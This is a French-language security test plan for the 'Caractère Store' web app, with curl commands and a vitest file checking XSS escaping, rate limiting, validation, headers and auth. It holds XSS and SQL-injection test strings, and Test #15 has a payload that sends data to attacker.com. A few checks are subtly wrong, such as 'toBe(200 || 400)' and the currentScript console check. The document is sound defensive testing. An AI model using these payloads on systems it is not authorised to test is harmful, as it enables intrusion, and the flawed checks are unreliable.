# 🧪 Tests de Sécurité - Caractère Store

## 1. Test XSS (Cross-Site Scripting)

### Test #1: XSS via /api/contact
```bash
# Testez avec du contenu XSS
curl -X POST https://localhost:3000/api/contact \
  -H "Content-Type: application/json" \
  -d '{
    "nom": "<img src=x onerror=alert(\"XSS\")>",
    "email": "test@test.com"
  }'

# ✅ DOIT RETOURNER: Email envoyé sans exécuter le script
# ❌ NE DOIT PAS: Afficher une alerte ou exécuter du JS
```

### Test #2: XSS via /api/admin/marketing/email
```bash
# Créer un email avec injection HTML
curl -X POST https://localhost:3000/api/admin/marketing/email \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN_SUPABASE>" \
  -d '{
    "subject": "Test",
    "message": "<script>alert(1)</script>{{NOM}}",
    "contacts": [
      { "nom": "John", "email": "test@example.com" }
    ]
  }'

# ✅ DOIT: Échapper le script
# ❌ NE DOIT PAS: Exécuter le script
```

---

## 2. Test Rate Limiting

### Test #3: Rate Limit sur /api/contact
```bash
#!/bin/bash
# Envoyez 10 requêtes rapides
for i in {1..10}; do
  echo "Request $i:"
  curl -X POST https://localhost:3000/api/contact \
    -H "Content-Type: application/json" \
    -d '{"nom":"Test","email":"test@test.com"}' \
    -s -o /dev/null -w "Status: %{http_code}\n"
  sleep 0.1
done

# ✅ ATTENDU:
# - Requêtes 1-5: Status 200
# - Requêtes 6-10: Status 429 (Too Many Requests)
```

### Test #4: Rate Limit sur /auth/login
```bash
#!/bin/bash
# Tentatives échouées rapides
for i in {1..6}; do
  echo "Login attempt $i:"
  curl -X POST https://localhost:3000/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"wrong"}' \
    -s -o /dev/null -w "Status: %{http_code}\n"
done

# ✅ ATTENDU:
# - Tentatives 1-5: Status 401 (Unauthorized)
# - Tentative 6: Status 429 (Rate Limited)
```

---

## 3. Test Validation d'Entrée

### Test #5: Email invalide
```bash
curl -X POST https://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "not-an-email",
    "password": "Test@1234"
  }'

# ✅ DOIT RETOURNER: Error 400 "Format email invalide"
```

### Test #6: Mot de passe faible
```bash
curl -X POST https://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@test.com",
    "password": "weak"
  }'

# ✅ DOIT RETOURNER: Error 400 "Mot de passe faible..."
# ❌ NE DOIT PAS: Accepter le mot de passe
```

### Test #7: JSON malformé
```bash
curl -X POST https://localhost:3000/api/contact \
  -H "Content-Type: application/json" \
  -d '{ INVALID JSON }'

# ✅ DOIT RETOURNER: Error 500 ou 400
# ❌ NE DOIT PAS: Crasher le serveur
```

---

## 4. Test Headers de Sécurité

### Test #8: Vérifier les headers de sécurité
```bash
curl -I https://caracterestore.dz

# ✅ DOIT VOIR:
# - X-Frame-Options: SAMEORIGIN
# - X-Content-Type-Options: nosniff
# - X-XSS-Protection: 1; mode=block
# - Strict-Transport-Security: max-age=31536000
# - Referrer-Policy: strict-origin-when-cross-origin
# - Content-Security-Policy: default-src 'self'...
```

### Test #9: CSP Evaluation
```bash
# Allez sur: https://csp-evaluator.withgoogle.com
# Collez: https://caracterestore.dz
# Vérifiez qu'il n'y a pas d'avertissements critiques
```

---

## 5. Test Authentification

### Test #10: Accès non-autorisé à /admin
```bash
curl https://localhost:3000/admin

# ✅ DOIT: Rediriger vers /auth/login
# ❌ NE DOIT PAS: Afficher le contenu admin
```

### Test #11: Token JWT expiré
```bash
curl -H "Authorization: Bearer expired.jwt.token" \
  https://localhost:3000/api/admin/contacts

# ✅ DOIT RETOURNER: Error 401 "Non autorisé"
```

### Test #12: Token JWT malformé
```bash
curl -H "Authorization: Bearer invalid" \
  https://localhost:3000/api/admin/contacts

# ✅ DOIT RETOURNER: Error 401
```

---

## 6. Test d'Injection (SQL, NoSQL, etc.)

### Test #13: SQL Injection sur recherche
```bash
# Si vous avez une recherche de produit
curl "https://localhost:3000/api/produits?search=1' OR '1'='1"

# ✅ DOIT: Traiter comme texte normal (Supabase paramétré)
# ❌ NE DOIT PAS: Retourner tous les produits
```

---

## 7. Test de Sécurité du Formulaire de Contact

### Test #14: Spam sur contact
```bash
#!/bin/bash
# 20 requêtes rapides (test rate limiting)
for i in {1..20}; do
  curl -X POST https://localhost:3000/api/contact \
    -H "Content-Type: application/json" \
    -d "{\"nom\":\"Spammer $i\",\"email\":\"spam$i@test.com\"}" \
    -s -o /dev/null -w "Request $i: %{http_code}\n"
done

# ✅ ATTENDU: 
# - Les 5 premières: 200
# - Les 15 autres: 429
```

### Test #15: Email personnalisé malveillant
```bash
curl -X POST https://localhost:3000/api/contact \
  -H "Content-Type: application/json" \
  -d '{
    "nom": "{{NOM}} <script>alert(1)</script>",
    "email": "test@test.com",
    "telephone": "+213123456789",
    "message": "<img src=x onerror=fetch(\"https://attacker.com?data=stole\")>"
  }'

# ✅ DOIT: Échapper tous les scripts
```

---

## 8. Tests Automatisés avec npm

### Créer un fichier `tests/security.test.js`:
```javascript
// tests/security.test.js
import { describe, it, expect } from 'vitest'

describe('Security Tests', () => {
  it('should escape XSS on /api/contact', async () => {
    const response = await fetch('/api/contact', {
      method: 'POST',
      body: JSON.stringify({
        nom: '<img src=x onerror="alert(1)">',
        email: 'test@test.com'
      })
    })
    
    expect(response.status).toBe(200)
    // Vérifier que le contenu est échappé dans l'email
  })

  it('should rate limit /api/contact after 5 requests', async () => {
    for (let i = 0; i < 5; i++) {
      const res = await fetch('/api/contact', { method: 'POST', body: '{}' })
      expect(res.status).toBe(200 || 400)
    }
    
    const lastRes = await fetch('/api/contact', { method: 'POST', body: '{}' })
    expect(lastRes.status).toBe(429)
  })

  it('should validate email format', async () => {
    const response = await fetch('/api/auth/register', {
      method: 'POST',
      body: JSON.stringify({
        email: 'invalid-email',
        password: 'Test@1234'
      })
    })
    
    expect(response.status).toBe(400)
  })
})
```

### Lancer les tests:
```bash
npm install -D vitest
npm test
```

---

## 9. Tests Manuels via Browser DevTools

### Test #16: Vérifier CSP dans la console
```javascript
// Ouvrez https://caracterestore.dz dans Chrome
// F12 → Console
// Tapez:
document.currentScript.getAttribute('integrity')

// ✅ DOIT afficher integrity hashes
```

### Test #17: Vérifier les cookies de sécurité
```javascript
// F12 → Application → Cookies
// Vérifiez que les session cookies ont:
// ✅ HttpOnly: Oui
// ✅ Secure: Oui
// ✅ SameSite: Strict ou Lax
```

---

## 10. Outils de Scanning Externe

### Gratuit (Online)
1. **OWASP ZAP**: https://www.zaproxy.org/ (scan local)
2. **Mozilla Observatory**: https://observatory.mozilla.org/
3. **SecurityHeaders.com**: https://securityheaders.com
4. **SSL Labs**: https://www.ssllabs.com/ssltest/
5. **Qualys SSL**: https://www.ssllabs.com/ssltest/

### Premium
1. **Burp Suite Professional**
2. **Acunetix**
3. **Fortify**
4. **UpGuard**: Security audit complet

---

## Checklist de Test Complète

- [ ] XSS sur tous les endpoints
- [ ] Rate limiting fonctionne
- [ ] Validation email OK
- [ ] Validation password OK
- [ ] Headers de sécurité présents
- [ ] CSP en place
- [ ] Authentification protégée
- [ ] Pas de secrets exposés
- [ ] Cookies sécurisés
- [ ] HTTPS obligatoire (HSTS)
- [ ] Pas de XXE
- [ ] Pas de CSRF (ou tokens présents)
- [ ] Logging des accès
- [ ] Alertes de sécurité activées

---

**Status**: ✅ Prêt à tester!

Pour toute question, contactez: **yakoumobi@gmail.com**
